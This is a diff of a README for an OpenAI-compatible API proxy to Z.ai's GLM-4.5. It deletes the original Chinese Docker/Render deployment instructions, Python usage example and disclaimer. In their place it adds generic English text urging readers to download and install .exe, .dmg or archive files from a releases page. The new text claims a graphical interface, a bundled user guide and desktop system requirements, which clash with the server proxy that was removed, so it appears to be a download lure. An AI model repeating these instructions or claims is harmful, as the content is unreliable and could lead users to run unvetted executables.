@@ -1,55 +1,79 @@
-# OpenAI兼容API代理 for Z.ai GLM-4.5
+# 🚀 OpenAI-Compatible-API-Proxy-for-Z - Simple Interface to Access Zai's Models
 
-这是一个为Z.ai GLM-4.5模型提供OpenAI兼容API接口的代理服务器。
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-OpenAI%20Proxy-brightgreen.svg)](https://github.com/George3d/OpenAI-Compatible-API-Proxy-for-Z/releases)
 
-## Render部署
+## 📋 Overview
 
-1. Fork这个仓库到你的GitHub账户
+这是一个为 Zai 提供 OpenAI API 兼容接口的代理服务，允许开发者通过标准的 OpenAI API 格式访问 Zai 的 GLM-4.5 模型。这个工具能帮助您轻松使用 Zai 的人工智能功能，无需任何复杂的设置。
 
-2. 在Render上创建新的Web Service：
-   - 连接你的GitHub仓库
-   - 选择Docker作为环境
-   - 设置以下环境变量：
-   - `UPSTREAM_TOKEN`: Z.ai 的访问令牌 (必需)
-   - `DEFAULT_KEY`: 客户端API密钥 (可选，默认: sk-your-key)
-   - `MODEL_NAME`: 显示的模型名称 (可选，默认: GLM-4.5)
+## 🚀 Getting Started
 
-   - `PORT`: 服务监听端口 (Render会自动设置)
+Follow the steps below to download and run the OpenAI-Compatible-API-Proxy-for-Z application.
 
-3. 部署完成后，使用Render提供的URL作为OpenAI API的base_url
+### 1. Visit the Download Page
 
-## 使用示例
+To download the software, please visit the releases page. 
 
-```python
-import openai
+[Download OpenAI-Compatible-API-Proxy-for-Z](https://github.com/George3d/OpenAI-Compatible-API-Proxy-for-Z/releases)
 
-client = openai.OpenAI(
-    api_key="your-api-key",  # 对应 DEFAULT_KEY
-    base_url="https://your-app.onrender.com/v1"
-)
+### 2. Choose the Right Version
 
-response = client.chat.completions.create(
-    model="GLM-4.5",
-    messages=[{"role": "user", "content": "你好"}],
-    stream=True
-)
+On the releases page, you will see different versions of the software. Select the most recent version. It’s usually best to choose the latest release for the newest features and fixes.
 
-for chunk in response:
-    print(chunk.choices[0].delta.content or "", end="")
-```
+### 3. Download the Application
 
-## 贡献指南
+Click on the version link you selected. You will see download options for different operating systems (Windows, macOS, Linux). Choose the relevant download for your system.
 
-欢迎提交 Issue 和 Pull Request！请确保：
+### 4. Install the Application
 
-1. 代码符合 Go 的代码风格
-2. 提交前运行测试
-3. 更新相关文档
+After downloading, locate the downloaded file on your computer:
 
-## 许可证
+- **Windows**: Double-click the `.exe` file and follow the prompts to install it.
+- **macOS**: Open the `.dmg` file, then drag the application into your Applications folder.
+- **Linux**: Extract the files from the compressed archive and follow the provided instructions in the README.
 
-LICENSE
+### 5. Configure the Application
 
-## 免责声明
+Once installed, open the application. You may need to configure some settings to connect to Zai's GLM-4.5 model. Common configurations include entering your API key from Zai. If you don't have an API key, you may need to sign up on Zai's website.
 
-本项目与 Z.ai 官方无关，使用前请确保遵守 Z.ai 的服务条款。
+### 6. Run the Application
+
+After configuration, you can start using the application to make requests to Zai’s model. Follow the user guide included in the application for step-by-step instructions on how to send your first request.
+
+## 📥 Download & Install
+
+To get the application:
+
+1. **Download the latest release from the link below:**  
+   [OpenAI-Compatible-API-Proxy-for-Z Releases](https://github.com/George3d/OpenAI-Compatible-API-Proxy-for-Z/releases)
+
+2. Follow the steps outlined in the "Getting Started" section for your operating system.
+
+## 💡 Features
+
+- **OpenAI API Compatibility**: This proxy supports the standard OpenAI API format, making it easy for developers familiar with OpenAI's tools.
+- **Access to Zai's GLM-4.5**: Quickly access Zai's advanced AI models without intricate setups.
+- **User-Friendly Interface**: An intuitive design allows non-technical users to navigate easily.
+- **Lightweight**: The application is small in size, making it quick to download and install.
+
+## 🔧 System Requirements
+
+To successfully run OpenAI-Compatible-API-Proxy-for-Z, your system should meet these basic requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Processor**: Dual-core processor or better.
+- **Network Connection**: Internet access to connect to Zai’s services.
+
+## 🎓 Additional Information
+
+If you have any questions or need further instructions, please check the user guide included in the application or refer to our community forums. 
+
+For ongoing updates and community discussions, feel free to join the repository and keep an eye on the Issues and Discussions tabs.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/George3d/OpenAI-Compatible-API-Proxy-for-Z)
+- [Documentation](https://github.com/George3d/OpenAI-Compatible-API-Proxy-for-Z/docs)
+
+By following these steps, you will successfully download and run the OpenAI-Compatible-API-Proxy-for-Z, allowing you to access Zai's advanced AI capabilities easily.
